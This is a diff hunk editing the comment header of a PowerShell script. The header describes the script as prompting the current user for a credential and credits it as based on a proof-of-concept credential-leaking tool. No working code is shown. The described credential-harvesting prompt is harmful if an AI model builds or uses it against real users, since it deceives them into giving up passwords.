@@ -1,9 +1,9 @@
-﻿
+
 <#
 .SYNOPSIS
   Standalone Powershell script that will promp the current user for a valid credential.
 
-.Author: @Dviros
+.Author: Based on @Dviros CredsLeaker (POC)
   Required Dependencies: target Account Password
   Optional Dependencies: None
 
